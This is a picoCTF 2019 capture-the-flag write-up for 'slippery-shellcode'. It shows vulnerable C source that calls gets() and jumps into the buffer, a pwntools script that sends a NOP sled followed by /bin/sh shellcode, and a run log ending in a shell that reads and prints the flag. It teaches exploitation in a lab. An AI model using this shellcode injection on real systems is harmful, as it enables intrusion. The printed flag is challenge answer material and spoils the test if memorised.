# slippery-shellcode
## Question
>This [program](files/vuln) is a little bit more tricky. Can you spawn a shell and use that to read the flag.txt? You can find the program in `/problems/slippery-shellcode_5_5cea4ae04c57923484bda350da9f4015` on the shell server. [Source](files/vuln.c).

## Hint
>NA

# Solution
## Source code
As you can see, because of the random offset, the program won't jump to the start of the buffer, but will instead jump to a random location within the first 256 bytes of the buffer.

What we need to do is prepend our shellcode with `NOP` instructions (`asm(shellcraft.nop()`).

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 512
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  char buf[BUFSIZE];

  puts("Enter your shellcode:");
  vuln(buf);

  puts("Thanks! Executing from a random location now...");

  int offset = (rand() % 256) + 1;
  
  ((void (*)())(buf+offset))();


  puts("Finishing Executing Shellcode. Exiting now...");
  
  return 0;
}
```

## Prepare the exploit
Let's first use `pwn template` to prepare our exploit template:
~~~~
$ pwn template --host 2019shell1.picoctf.com --user sdam --path /problems/slippery-shellcode_5_5cea4ae04c57923484bda350da9f4015/vuln > exploit.py
~~~~

Edit the `exploit.py` script and replace the `EXPLOIT GOES HERE` section with the following content:
```python
io = start()
shellcode = asm(shellcraft.sh())
io.recvuntil("Enter your shellcode:")
payload = fit({256: shellcode}, filler = asm(shellcraft.nop()))
io.sendline(payload)
io.interactive()
```

## Run the exploit
~~~~
$ ./exploit.py 
[*] '/data/documents/challenges/picoCTF_2019/binary-exploitation/200-slippery-shellcode/files/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[+] Connecting to 2019shell1.picoctf.com on port 22: Done
[*] sdam@2019shell1.picoctf.com:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[+] Opening new channel: 'pwd': Done
[+] Receiving all data: Done (11B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Working directory: '/tmp/tmp.oyw8UOIoTV'
[+] Opening new channel: 'ln -s /home/sdam/* .': Done
[+] Receiving all data: Done (0B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[+] Starting remote process b'/problems/slippery-shellcode_5_5cea4ae04c57923484bda350da9f4015/vuln' on 2019shell1.picoctf.com: pid 3717218
[*] Switching to interactive mode

\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90jhh///sh/bin\x89\xe3h\x814$ri1\xc9Qj\x04\xe1Q\x89\xe11\xd2j\x0bÍ€
Thanks! Executing from a random location now...
$ $ pwd
/tmp/tmp.oyw8UOIoTV
$ $ cat /problems/slippery-shellcode_5_5cea4ae04c57923484bda350da9f4015/flag.txt
picoCTF{sl1pp3ry_sh311c0d3_ecc37b22}
~~~~

# Flag
`picoCTF{sl1pp3ry_sh311c0d3_ecc37b22}`
